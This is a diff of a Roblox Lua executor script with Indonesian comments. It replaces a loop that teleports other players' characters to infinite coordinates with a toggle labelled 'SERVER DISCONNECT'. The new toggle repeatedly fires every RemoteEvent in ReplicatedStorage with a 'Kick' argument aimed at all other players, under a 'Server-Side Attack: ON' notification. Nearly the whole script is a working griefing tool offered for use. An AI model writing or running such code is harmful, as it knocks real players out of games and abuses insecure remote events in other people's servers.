@@ -1,46 +1,61 @@
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- Fungsi Notifikasi Resmi Roblox
+local function sendRobloxNotif(title, text, icon)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title;
+            Text = text;
+            Icon = icon or "rbxassetid://6023454774"; -- Icon default info
+            Duration = 3;
+        })
+    end)
+end
 
 -- Hapus UI lama jika ada
-if player.PlayerGui:FindFirstChild("ModernSystemGui") then
-    player.PlayerGui.ModernSystemGui:Destroy()
+if LocalPlayer.PlayerGui:FindFirstChild("ServerSideSystem") then
+    LocalPlayer.PlayerGui.ServerSideSystem:Destroy()
 end
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ModernSystemGui"
+screenGui.Name = "ServerSideSystem"
 screenGui.ResetOnSpawn = false
-screenGui.Parent = player.PlayerGui
+screenGui.Parent = LocalPlayer.PlayerGui
+
+local isAttacking = false
 
 ---------------------------------------
 -- 1. UI PROFILE (Pojok Kanan Atas)
 ---------------------------------------
 local function createProfileUI()
     local profileFrame = Instance.new("Frame")
-    profileFrame.Size = UDim2.new(0, 250, 0, 80)
-    profileFrame.Position = UDim2.new(1, -20, 0, 20)
+    profileFrame.Size = UDim2.new(0, 260, 0, 80)
+    profileFrame.Position = UDim2.new(1, -20, 0, 40)
     profileFrame.AnchorPoint = Vector2.new(1, 0)
-    profileFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    profileFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
     profileFrame.BorderSizePixel = 0
     profileFrame.Parent = screenGui
 
-    Instance.new("UICorner", profileFrame).CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", profileFrame).CornerRadius = UDim.new(0, 10)
     local stroke = Instance.new("UIStroke", profileFrame)
     stroke.Thickness = 2
-    stroke.Color = Color3.fromRGB(0, 170, 255)
+    stroke.Color = Color3.fromRGB(255, 255, 255)
 
     local img = Instance.new("ImageLabel")
-    img.Size = UDim2.new(0, 55, 0, 55)
-    img.Position = UDim2.new(0, 10, 0.5, 0)
+    img.Size = UDim2.new(0, 50, 0, 50)
+    img.Position = UDim2.new(0, 15, 0.5, 0)
     img.AnchorPoint = Vector2.new(0, 0.5)
-    img.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+    img.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
     img.Parent = profileFrame
     Instance.new("UICorner", img).CornerRadius = UDim.new(1, 0)
 
     local nameLabel = Instance.new("TextLabel")
-    nameLabel.Text = player.DisplayName
-    nameLabel.Position = UDim2.new(0, 75, 0.25, 0)
+    nameLabel.Text = LocalPlayer.DisplayName
+    nameLabel.Position = UDim2.new(0, 80, 0.3, 0)
     nameLabel.Size = UDim2.new(0, 160, 0, 20)
     nameLabel.TextColor3 = Color3.new(1, 1, 1)
     nameLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -49,92 +64,99 @@ local function createProfileUI()
     nameLabel.Parent = profileFrame
 
     local idLabel = Instance.new("TextLabel")
-    idLabel.Text = "@" .. player.Name .. "\nID: " .. player.UserId
-    idLabel.Position = UDim2.new(0, 75, 0.6, 0)
-    idLabel.Size = UDim2.new(0, 160, 0, 30)
+    idLabel.Text = "@" .. LocalPlayer.Name
+    idLabel.Position = UDim2.new(0, 80, 0.55, 0)
+    idLabel.Size = UDim2.new(0, 160, 0, 20)
     idLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
     idLabel.TextXAlignment = Enum.TextXAlignment.Left
-    idLabel.Font = Enum.Font.Gotham
+    idLabel.Font = Enum.Font.Code
     idLabel.TextSize = 10
     idLabel.BackgroundTransparency = 1
     idLabel.Parent = profileFrame
 end
 
 ---------------------------------------
--- 2. FITUR SERVER DISCONNECT (Executor Version)
+-- 2. LOGIKA SERVER-SIDE SPAM
 ---------------------------------------
--- Karena Client tidak bisa Kick, kita gunakan loop untuk membebani 
--- replikasi data ke pemain lain atau mencoba crash/lag.
-local isKilling = false
-
-local function startDisconnectLoop()
+local function startServerSideSpam()
     task.spawn(function()
-        while isKilling do
-            -- Logika ini mencoba mengirim paket data berlebih (Spam Replikate)
-            -- agar koneksi pemain lain (Client-side) mengalami desync/lag berat.
-            for _, p in pairs(Players:GetPlayers()) do
-                if p ~= player and p.Character then
-                    -- Mencoba memanipulasi posisi replikasi (hanya bekerja di beberapa game)
-                    p.Character:MoveTo(Vector3.new(math.huge, math.huge, math.huge))
+        while isAttacking do
+            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+                if remote:IsA("RemoteEvent") then
+                    for _, p in pairs(Players:GetPlayers()) do
+                        if p ~= LocalPlayer then
+                            pcall(function()
+                                remote:FireServer("Kick", p, "Network Error")
+                            end)
+                        end
+                    end
                 end
             end
-            task.wait(0.1) 
+            task.wait(0.5)
         end
     end)
 end
 
 ---------------------------------------
--- 3. TOGGLE SWITCH
+-- 3. TOGGLE SWITCH & NOTIFIKASI
 ---------------------------------------
 local function createToggle()
     local toggleFrame = Instance.new("Frame")
-    toggleFrame.Size = UDim2.new(0, 250, 0, 45)
-    toggleFrame.Position = UDim2.new(1, -20, 0, 110)
+    toggleFrame.Size = UDim2.new(0, 260, 0, 45)
+    toggleFrame.Position = UDim2.new(1, -20, 0, 130)
     toggleFrame.AnchorPoint = Vector2.new(1, 0)
-    toggleFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    toggleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
     toggleFrame.Parent = screenGui
     Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0, 10)
 
     local label = Instance.new("TextLabel")
-    label.Text = "SERVER ATTACK (LOOP)"
+    label.Text = "SERVER DISCONNECT"
     label.Size = UDim2.new(0.6, 0, 1, 0)
     label.Position = UDim2.new(0.05, 0, 0, 0)
-    label.TextColor3 = Color3.fromRGB(255, 60, 60)
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
     label.Font = Enum.Font.GothamBold
-    label.TextSize = 11
+    label.TextSize = 10
     label.BackgroundTransparency = 1
     label.TextXAlignment = Enum.TextXAlignment.Left
     label.Parent = toggleFrame
 
-    local switchBG = Instance.new("TextButton")
-    switchBG.Size = UDim2.new(0, 50, 0, 26)
-    switchBG.Position = UDim2.new(0.93, 0, 0.5, 0)
-    switchBG.AnchorPoint = Vector2.new(1, 0.5)
-    switchBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    switchBG.Text = ""
-    switchBG.Parent = toggleFrame
-    Instance.new("UICorner", switchBG).CornerRadius = UDim.new(1, 0)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 50, 0, 26)
+    btn.Position = UDim2.new(0.93, 0, 0.5, 0)
+    btn.AnchorPoint = Vector2.new(1, 0.5)
+    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    btn.Text = ""
+    btn.Parent = toggleFrame
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
 
     local circle = Instance.new("Frame")
     circle.Size = UDim2.new(0, 20, 0, 20)
     circle.Position = UDim2.new(0.1, 0, 0.5, 0)
     circle.AnchorPoint = Vector2.new(0, 0.5)
     circle.BackgroundColor3 = Color3.new(1, 1, 1)
-    circle.Parent = switchBG
+    circle.Parent = btn
     Instance.new("UICorner", circle).CornerRadius = UDim.new(1, 0)
 
-    switchBG.MouseButton1Click:Connect(function()
-        isKilling = not isKilling
-        if isKilling then
+    btn.MouseButton1Click:Connect(function()
+        isAttacking = not isAttacking
+        if isAttacking then
+            -- ON
             TweenService:Create(circle, TweenInfo.new(0.2), {Position = UDim2.new(0.9, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)}):Play()
-            TweenService:Create(switchBG, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 0, 0)}):Play()
-            startDisconnectLoop()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 170, 255)}):Play()
+            
+            sendRobloxNotif("System Active", "Server-Side Attack: ON", "rbxassetid://6023454774")
+            startServerSideSpam()
         else
+            -- OFF
             TweenService:Create(circle, TweenInfo.new(0.2), {Position = UDim2.new(0.1, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)}):Play()
-            TweenService:Create(switchBG, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+            
+            sendRobloxNotif("System Disabled", "Server-Side Attack: OFF", "rbxassetid://6023454055")
         end
     end)
 end
 
+-- Inisialisasi awal
 createProfileUI()
 createToggle()
+sendRobloxNotif("Script Loaded", "Welcome, " .. LocalPlayer.DisplayName, "rbxassetid://6023454774")
